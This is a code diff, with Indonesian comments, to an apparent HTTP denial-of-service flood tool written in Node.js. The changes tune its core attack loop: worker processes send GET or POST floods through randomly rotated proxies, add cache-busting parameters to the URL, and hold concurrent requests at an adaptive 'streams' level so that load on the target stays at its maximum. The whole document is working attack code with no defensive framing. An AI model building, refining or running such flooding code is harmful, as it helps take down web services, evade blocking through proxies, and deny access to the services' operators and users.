@@ -31,6 +31,7 @@ function runHttpAttack(targetUrl, durationSeconds, attackType) {
     console.log(`Worker ${process.pid} memulai serangan ${attackName} ke ${target.host} selama ${durationSeconds} detik.`);
 
     let isAttackActive = true;
+    let activeRequests = 0; // Lacak permintaan yang sedang berjalan
  
     const fuzzUrl = (originalUrl) => {
         let finalUrl = originalUrl;
@@ -59,26 +60,37 @@ function runHttpAttack(targetUrl, durationSeconds, attackType) {
         return finalUrl + (finalUrl.includes('?') ? '&' : '?') + cacheBustingParam;
     };
 
-    const attack = () => {
+    const attack = () => { // Fungsi ini sekarang hanya meluncurkan satu permintaan
+        activeRequests++;
+        localSent++;
+
         const finalUrl = fuzzUrl(targetUrl);
         
         const proxyUrl = proxyList.length > 0 ? proxyList[Math.floor(Math.random() * proxyList.length)] : undefined;
         const options = getAxiosOptions(target, proxyUrl, controller.signal);
 
-        localSent++;
+        const onComplete = () => {
+            activeRequests--;
+        };
+        const onError = (error) => {
+            // Jangan hitung error jika permintaan dibatalkan secara sengaja (mis. saat stop)
+            if (!axios.isCancel(error)) {
+                localError++;
+            }
+        };
 
         if (isPostAttack) {
             const { payload, type } = getRandomPayload();
             let data = payload;
             if (type === 'json') {
                 // Axios handles JSON objects automatically
-            } else {
+            } else { // 'form'
                 // Axios handles URLSearchParams for form data
                 options.headers['Content-Type'] = 'application/x-www-form-urlencoded';
             }
-            axios.post(finalUrl, data, options).catch(() => { localError++; });
+            axios.post(finalUrl, data, options).catch(onError).finally(onComplete);
         } else {
-            axios.get(finalUrl, options).catch(() => { localError++; });
+            axios.get(finalUrl, options).catch(onError).finally(onComplete);
         }
     };
  
@@ -119,16 +131,15 @@ function runHttpAttack(targetUrl, durationSeconds, attackType) {
                 attackState.streams = Math.max(MIN_STREAMS, attackState.streams - 25);
                 break;
         }
-        const streamsThisLoop = Math.floor(attackState.streams);
-
-        for (let i = 0; i < streamsThisLoop; i++) {
+        
+        // Pertahankan jumlah koneksi konkuren agar sesuai dengan `attackState.streams`
+        // Ini mencegah pembuatan permintaan yang tidak terkendali dan membanjiri event loop.
+        while (isAttackActive && activeRequests < attackState.streams) {
             attack();
         }
 
-        // Gunakan setTimeout dengan delay kecil untuk mencegah event loop blocking.
-        // Ini memastikan bahwa timer lain (seperti statsInterval) mendapat kesempatan untuk berjalan,
-        // sehingga laporan menjadi lebih akurat dan real-time.
-        setTimeout(attackLoop, 1);
+        // Jadwalkan pemeriksaan berikutnya untuk menambah koneksi jika perlu.
+        setTimeout(attackLoop, 10);
     };
 
     // Lapor statistik secara berkala setiap 5 detik
